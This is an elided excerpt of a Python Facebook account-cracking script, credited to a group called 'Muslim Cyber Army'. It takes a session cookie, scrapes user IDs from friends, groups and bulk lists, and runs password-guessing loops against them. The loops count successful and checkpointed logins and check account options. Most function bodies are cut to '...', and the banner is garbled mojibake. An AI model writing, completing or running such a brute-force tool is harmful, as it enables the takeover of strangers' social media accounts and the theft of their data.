...
â–‚â–‚â–‚â–‚â–‚â–‚â•­â”â•®â–‚â–‚â–‚â–‚â–‚â–‚â–‚   â–‚â–‚â–‚â–‚â–‚â–‚â”£â”â”«â–‚â–‚â–‚â–‚â–‚â–‚â–‚   â–‚â–‚â–‚â–‚â–‚â–‚â”ƒâ•­â”ƒâ–‚â–‚â–‚â–‚â–‚â–‚â–‚   â–‚â–‚â–‚â–‚â•­â”â”«â”ˆâ”£â”â•®â–‚â–‚â–‚â–‚â–‚   â–‚â–‚â•­â”â”ƒâ•­â”ƒâ•­â”ƒâ•­â”ƒâ”â•®â–‚â–‚â–‚   â–‚â–‚â•²â•­â”ƒâ•¯â”ƒâ•¯â”ƒâ•¯â”ƒâ•­â”ƒâ–‚â–‚â–‚

â€¢ GITHUB : https://github.com/Clay-XD/
â€¢ GROUP : MUSLIM CYBER ARMY
'''
...
def login_lagi334():
	try:
		banner()
		___kontol___ = input('[ðŸ§] Masukkan Cookies : ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":___kontol___}) 
...
[05] GROUP MEMBERS           [00] LOGOUT[bold cyan]'''
	...
	cetak(nel(oi, title='[bold cyan] â€¢ MENU CRACK â€¢ [/bold cyan]'))
...
def file():
	...
	print(x+'['+h+'â€¢'+x+'] READING THE FILE, WAIT A MINUTE â€¢â€¢â€¢')
	time.sleep(2)
...
def dump_publik():
	...
	sol().print(win2)
	print(x+'['+h+'â€¢'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
...
def dump_massal():
	...
	cetak(nel(mas2,title=' â€¢ BULK MENU â€¢'))
	...
	if pilih in ['1','01']:
		...
		print(x+'['+h+'â€¢'+x+'] ENTER TOTAL ID LIMIT [20]')
		try:
...
def dump_grup():
	...
	ses = requests.Session()
	try:
		res = sop(ses.get(link, headers={"user-agent": 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00/101.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.35 Mobile Safari/533.4 3gpp-gba'}).text, "html.parser")
	except requests.exceptions.ConnectionError:
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%s â˜¬ %s/%s â˜¬ :%s â˜¬ :%s â˜¬ %s%s%s â˜¬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
...
def crackfree(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s â˜¬ %s/%s â˜¬ ALHAMDULILLAH:%s â˜¬ SYUKURIN:%s â˜¬ %s%s%s â˜¬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
...
def cek_opsi():
	...
	for kes in akun:
		try:
			...
			ua = 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-US; R1001 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.5.2.582 U3/0.8.0 Mobile Safari/534.30'
			ses = requests.Session()
